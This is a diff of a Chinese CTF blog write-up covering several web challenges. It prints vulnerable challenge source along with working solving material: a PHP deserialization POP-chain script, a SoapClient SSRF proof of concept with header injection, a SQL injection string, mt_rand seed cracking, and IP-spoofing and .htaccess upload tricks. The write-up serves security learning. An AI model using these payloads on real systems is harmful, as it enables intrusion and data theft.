@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    3.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    15 分
                 </div>
                 
 
@@ -487,21 +487,21 @@ print res.text
 <p>File 参数后门跟着一串base64编码两次的字符串 对其解码为</p>
 <p>ctfimage.jpg</p>
 <p>判断存在文件包含漏洞 构造index.php 编码两次传入得到源码</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php
+<pre><code>&lt;?php
 error_reporting(E_ALL || ~E_NOTICE);
 
 header('content-type:text/html;charset=utf-8');
 if(! isset($_GET['file']))
     header('Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg==');
 $file = base64_decode(base64_decode($_GET['file']));
-echo '<title>'.$_GET['file'].'';
-$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
-echo 'input_filename:   '. $file.'<br>';
-$file = str_replace("ctf","flag", $file);
-echo 'real_filename:   '.$file.'<br>';
+echo '&lt;title&gt;'.$_GET['file'].'&lt;/title&gt;';
+$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
+echo 'input_filename:   '. $file.'&lt;/br&gt;';
+$file = str_replace(&quot;ctf&quot;,&quot;flag&quot;, $file);
+echo 'real_filename:   '.$file.'&lt;/br&gt;';
 $txt = base64_encode(file_get_contents($file));
  
-echo "<img src="data:image/gif;base64," .$txt."">";
+echo &quot;&lt;img src='data:image/gif;base64,&quot;.$txt.&quot;'&gt;&lt;/img&gt;&quot;;
 /*
  * Can you find the flag file?
  *
@@ -510,7 +510,7 @@ echo "<img src="data:image/gif;base64," .$txt."">";
  
 </code></pre>
 <p>里面写的ctf换flag参数根本没用上，不知道出题人的意思是啥，读hint下的文件</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php
+<pre><code>&lt;?php
 $argv[1]=$_GET['url'];
 if(filter_var($argv[1],FILTER_VALIDATE_URL))
 {
@@ -522,14 +522,14 @@ if(filter_var($argv[1],FILTER_VALIDATE_URL))
 		echo($url);
 	}else
 	{
-		echo("error");
+		echo(&quot;error&quot;);
 	}
 
 }else
 {
-	echo "403 Forbidden";
+	echo &quot;403 Forbidden&quot;;
 }
-?>
+?&gt;
 </code></pre>
 <p>百度了只找到绕过过滤打xss的方法，但是读文件怎么读不知道。</p>
 <p>传了个 data://@happyctf.com/…/…/…/…/flag.txt  还是读不到</p>
@@ -585,23 +585,23 @@ for i in s:
 <p>这里的flag很短，可以直接读到，不需要regexp。</p>
 <h4 id="web4">web4</h4>
 <p>本以为是上传docx xxe盲打，但是发现会直接回显上传docx中core.xml中的title，并且给了源码，upload.php.bak</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php
-if(isset($_POST["submit"])) {
-    $target_file = getcwd()."/upload/".md5($_FILES["file"]["tmp_name"]);
-    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+<pre><code>&lt;?php
+if(isset($_POST[&quot;submit&quot;])) {
+    $target_file = getcwd().&quot;/upload/&quot;.md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
+    if (move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file)) {
         try {
-            $result = @file_get_contents("zip://".$target_file."#docProps/core.xml");
+            $result = @file_get_contents(&quot;zip://&quot;.$target_file.&quot;#docProps/core.xml&quot;);
             $xml = new SimpleXMLElement($result, LIBXML_NOENT);
-            $xml->registerXPathNamespace("dc", "http://purl.org/dc/elements/1.1/");
-            foreach($xml->xpath('//dc:title') as $title){
-                echo "Title '".$title . "' has been added.<br>";
+            $xml-&gt;registerXPathNamespace(&quot;dc&quot;, &quot;http://purl.org/dc/elements/1.1/&quot;);
+            foreach($xml-&gt;xpath('//dc:title') as $title){
+                echo &quot;Title '&quot;.$title . &quot;' has been added.&lt;br/&gt;&quot;;
             }
         } catch (Exception $e){
             echo $e;
-            echo "上传文件不是一个docx文档.";
+            echo &quot;上传文件不是一个docx文档.&quot;;
         }
     } else {
-        echo "上传失败.";
+        echo &quot;上传失败.&quot;;
     }
 }
 </code></pre>
@@ -611,8 +611,8 @@ if(isset($_POST["submit"])) {
 <h3 id="天璇新生赛">天璇新生赛</h3>
 <p>密码学后面的不会 前面的太简单 就不记录了</p>
 <h4 id="web-ezpop">web ezpop</h4>
-<pre class=" language-language-php"><code class="language-language-php">Welcome to index.php
-<?php
+<pre><code>Welcome to index.php
+&lt;?php
 //flag is in flag.php
 //WTF IS THIS?
 //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
@@ -623,7 +623,7 @@ class Modifier {
         include($value);
     }
     public function __invoke(){
-        $this->append($this->var);
+        $this-&gt;append($this-&gt;var);
     }
 }
 
@@ -631,17 +631,17 @@ class Show{
     public $source;
     public $str;
     public function __construct($file='index.php'){
-        $this->source = $file;
-        echo 'Welcome to '.$this->source."<br>";
+        $this-&gt;source = $file;
+        echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;;
     }
     public function __toString(){
-        return $this->str->source;
+        return $this-&gt;str-&gt;source;
     }
 
     public function __wakeup(){
-        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
-            echo "hacker";
-            $this->source = "index.php";
+        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
+            echo &quot;hacker&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
         }
     }
 }
@@ -649,11 +649,11 @@ class Show{
 class Test{
     public $p;
     public function __construct(){
-        $this->p = array();
+        $this-&gt;p = array();
     }
 
     public function __get($key){
-        $function = $this->p;
+        $function = $this-&gt;p;
         return $function();
     }
 }
@@ -668,11 +668,11 @@ else{
 </code></pre>
 <p>这个序列化pop链很简单，当时构造出来怎么都跑不出来，后来发现是因为忘了urlencode一次，导致protected属性没被带进去。。。</p>
 <p>脚本</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php
+<pre><code>&lt;?php
 class Modifier {
     protected  $var;
     public function __construct(){
-    	$this->var = "php://filter/read=convert.base64-encode/resource=flag.php";
+    	$this-&gt;var = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
     }
 }
 
@@ -687,9 +687,9 @@ class Test{
 
 
 $a = new Show();
-$a->source = new Show();
-$a->source->str=new Test();
-$a->source->str->p=new Modifier();
+$a-&gt;source = new Show();
+$a-&gt;source-&gt;str=new Test();
+$a-&gt;source-&gt;str-&gt;p=new Modifier();
 
 echo(urlencode(serialize($a)));
 </code></pre>
@@ -701,14 +701,14 @@ echo(urlencode(serialize($a)));
 <p>这里肯定是不能直接访问的，那么就想是如何判断是否为授权用户的呢。刚好前几天在写前端，想到前端跳后端一般是完成逻辑----&gt;赋值session-----&gt;后端判断是否有session，但是这里看到前端传入的code并没有跳到任何php文件中进行判断（唯一跳进的php文件还被删除了），是直接由前端判断而后转入flag.php。 那么很可能判断的条件是 refer（访问该页面的上一个页面），尝试无果后。</p>
 <p>学弟扔了个 xff构造成功。。。</p>
 <h4 id="web-ezbypass">web ezbypass</h4>
-<pre class=" language-language-php"><code class="language-language-php">
+<pre><code>
 I put something in F12 for you
 include 'flag.php';
 $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
-if(isset($_GET['gg'])&&isset($_GET['id'])) {
+if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) {
     $id=$_GET['id'];
     $gg=$_GET['gg'];
-    if (md5($id) === md5($gg) && $id !== $gg) {
+    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
         echo 'You got the first step';
         if(isset($_POST['passwd'])) {
             $passwd=$_POST['passwd'];
@@ -722,7 +722,7 @@ if(isset($_GET['gg'])&&isset($_GET['id'])) {
                  }
                  else
                  {
-                     echo "can you think twice??";
+                     echo &quot;can you think twice??&quot;;
                  }
             }
             else{
@@ -735,7 +735,7 @@ if(isset($_GET['gg'])&&isset($_GET['id'])) {
         }
 }
     else {
-        echo "You are not a real hacker!";
+        echo &quot;You are not a real hacker!&quot;;
     }
 }
 else{
@@ -748,22 +748,22 @@ else{
 <h4 id="web-文件上传">web 文件上传</h4>
 <p>没什么好说的 传个.htaccess解析jpg就行了</p>
 <h4 id="web-套娃">web 套娃</h4>
-<pre class=" language-language-php"><code class="language-language-php"><!--
+<pre><code>&lt;!--
 //1st
 $query = $_SERVER['QUERY_STRING'];
 
  if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
     die('Y0u are So cutE!');
 }
- if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
-    echo "you are going to the next ~";
+ if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){
+    echo &quot;you are going to the next ~&quot;;
 }
-!-->
+!--&gt;
 </code></pre>
 <p>第一个判断用.就可以绕过，在php中 .会被替换成下划线。</p>
 <p>第二个判断加个%0a就可以。</p>
 <p>得到一个secrettw.php jsfuck提示传入 Merak参数得到源码</p>
-<pre class=" language-language-php"><code class="language-language-php">Flag is here~But how to get it? <?php 
+<pre><code>Flag is here~But how to get it? &lt;?php 
 error_reporting(0); 
 include 'takeip.php';
 ini_set('open_basedir','.'); 
@@ -778,30 +778,35 @@ if(isset($_POST['Merak'])){
 function change($v){ 
     $v = base64_decode($v); 
     $re = ''; 
-    for($i=0;$i<strlen($v);$i++){ 
+    for($i=0;$i&lt;strlen($v);$i++){ 
         $re .= chr ( ord ($v[$i]) + $i*2 ); 
     } 
     return $re; 
 }
-echo 'Local access only!'."<br/>";
+echo 'Local access only!'.&quot;&lt;br/&gt;&quot;;
 $ip = getIp();
 if($ip!='127.0.0.1')
-echo "Sorry,you don't have permission!  Your ip is :".$ip;
-if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
-echo "Your REQUEST is:".change($_GET['file']);
+echo &quot;Sorry,you don't have permission!  Your ip is :&quot;.$ip;
+if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){
+echo &quot;Your REQUEST is:&quot;.change($_GET['file']);
 echo file_get_contents(change($_GET['file'])); }
-?> 
+?&gt; 
 </code></pre>
 <p>第一个ip用client-ip就可以过</p>
 <p>第二个判断条件 传入的参数会经过一个change函数来替换，写一个逆推出可得到flag的字符串</p>
-<pre class=" language-language-php"><code class="language-language-php">function decry(){
+<pre><code>function decry(){
 	$v = 'flag.php';
 	$re = '';
-	for($i=0;$i<strlen($v);$i++){ $re .="chr(ord($v[$i])" - $i*2); } echo($re); < code></strlen($v);$i++){></code></pre>
+	for($i=0;$i&lt;strlen($v);$i++){
+		$re .= chr(ord($v[$i]) - $i*2);
+	}
+	echo($re);
+}
+</code></pre>
 <p>然后base64编码一下传过去就行</p>
 <h4 id="web-audit">web audit</h4>
 <p>扫描到一个www.zip，其中index.php代码如下</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php 
+<pre><code>&lt;?php 
 header('Content-type:text/html; charset=utf-8');
 error_reporting(0);
 if(isset($_POST['login'])){
@@ -811,24 +816,24 @@ if(isset($_POST['login'])){
     if (($username == '') || ($password == '') ||($Private_key == '')) {
         // 若为空,视为未填写,提示错误,并3秒后返回登录界面
         header('refresh:2; url=login.html');
-        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
+        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;
         exit;
 }
     else if($Private_key != '*************' )
     {
         header('refresh:2; url=login.html');
-        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
+        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;
         exit;
     }
 
     else{
         if($Private_key === '************'){
-        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
-        $link=mysql_connect("localhost","root","root");
-        mysql_select_db("test",$link);
+        $getuser = &quot;SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'&quot;.';'; 
+        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
+        mysql_select_db(&quot;test&quot;,$link);
         $result = mysql_query($getuser);
         while($row=mysql_fetch_assoc($result)){
-            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
+            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;
         }
     }
     }
@@ -838,7 +843,7 @@ if(isset($_POST['login'])){
 function public_key($length = 16) {
     $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     $public_key = '';
-    for ( $i = 0; $i < $length; $i++ )
+    for ( $i = 0; $i &lt; $length; $i++ )
     $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
     return $public_key;
   }
@@ -847,13 +852,13 @@ function public_key($length = 16) {
   function private_key($length = 12) {
     $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     $private_key = '';
-    for ( $i = 0; $i < $length; $i++ )
+    for ( $i = 0; $i &lt; $length; $i++ )
     $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
     return $private_key;
   }
   $Public_key = public_key();
   //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
-</td></code></pre>
+</code></pre>
 <p>题目要求我们传入私钥和服务器计算出的私钥相同，就是mt_rand的种子可猜解问题，因为得知计算出的公钥，可以猜解种子。</p>
 <p>脚本：</p>
 <pre class=" language-language-python"><code class="language-language-python">str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
@@ -870,13 +875,13 @@ for i in range(len(str2)):
 print(res)
 </code></pre>
 <p>得到一串php_mt_seed可识别的字符串，用php_mt_seed爆破种子得到1775196155</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php
+<pre><code>&lt;?php
 mt_srand(1775196155);
 
 function public_key($length = 16) {
     $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     $public_key = '';
-    for ( $i = 0; $i < $length; $i++ )
+    for ( $i = 0; $i &lt; $length; $i++ )
     $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
     return $public_key;
   }
@@ -884,14 +889,14 @@ function public_key($length = 16) {
 function private_key($length = 12) {
     $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     $private_key = '';
-    for ( $i = 0; $i < $length; $i++ )
+    for ( $i = 0; $i &lt; $length; $i++ )
     $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
     echo $private_key;
 }
 
 public_key();
 private_key();
-</code></code></pre>
+</code></pre>
 <p>一定要先跑一次公钥再算私钥，因为服务器先算了公钥再算的私钥，如果只算私钥，mt_rand顺序就会错。然后提交私钥，并且构造password= 1’ or ‘1’='1 得到flag。</p>
 <h4 id="web-Ezpop-Revenge">web Ezpop_Revenge</h4>
 <p>题目可下载www.zip直接得到一整套源码（我透</p>
@@ -914,24 +919,24 @@ private_key();
 <p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/QQ%E5%9B%BE%E7%89%8720200329233107.png" alt></p>
 <p>这里的_sqlPreBuild 和 _adapter属性都可控，那么就可以打出__call方法，想到要打ssrf，就是SoapClient类了。</p>
 <p>构造poc</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php
+<pre><code>&lt;?php
 class Typecho_Db_Query{
 	private $_adapter;
 	private $_sqlPreBuild;
 	public function __construct(){
-		$this->_adapter = new SoapClient(null,array('location' => "http://127.0.0.1/flag.php",
-                               'user_agent' => "AAA:BBB\r\n" .
-                                             "Cookie:PHPSESSID=uiklqref225rf3h3dv01dcnmh3",
-                               'uri' => "http://127.0.0.1/"));
-		$this->_sqlPreBuild['action']='SELECT';
+		$this-&gt;_adapter = new SoapClient(null,array('location' =&gt; &quot;http://127.0.0.1/flag.php&quot;,
+                               'user_agent' =&gt; &quot;AAA:BBB\r\n&quot; .
+                                             &quot;Cookie:PHPSESSID=uiklqref225rf3h3dv01dcnmh3&quot;,
+                               'uri' =&gt; &quot;http://127.0.0.1/&quot;));
+		$this-&gt;_sqlPreBuild['action']='SELECT';
 	}
 }
 class HelloWorld_DB{
 	private $coincidence;
 	public function __construct(){
-		$this->coincidence=array(
-			"hello" => new Typecho_Db_Query(),
-			"world" => "typecho_"
+		$this-&gt;coincidence=array(
+			&quot;hello&quot; =&gt; new Typecho_Db_Query(),
+			&quot;world&quot; =&gt; &quot;typecho_&quot;
 		);
 	}
 }
@@ -1498,32 +1503,30 @@ im.show()
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/year/03/29/刷题记录/">
+                <a href="/year/03/30/HarekazeCTF2019/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="刷题记录0319">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="HarekazeCTF2019-Avatar Uploader">
                         
-                        <span class="card-title">刷题记录0319</span>
+                        <span class="card-title">HarekazeCTF2019-Avatar Uploader</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            易博霖比赛 web1
-这比赛几乎都是原题改的，难度低，web分数不吃香，最后只拿了第七。
-web1和code-breaking的原题差不多，加了个过滤，不过用session可以直接rce
-&lt;?php
-if(isset($_GET['v
+                            0x00 前言
+今天做了HarekazeCTF2019的两道Avatar Uploader，感觉非常有意思，于是在此记录一下。题目都是给了源码的，所以考验代码审计能力。
+0x01 Avatar Uploader1
+第一题比较简单，主要考的是
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-29
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1536,7 +1539,6 @@ if(isset($_GET['v
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
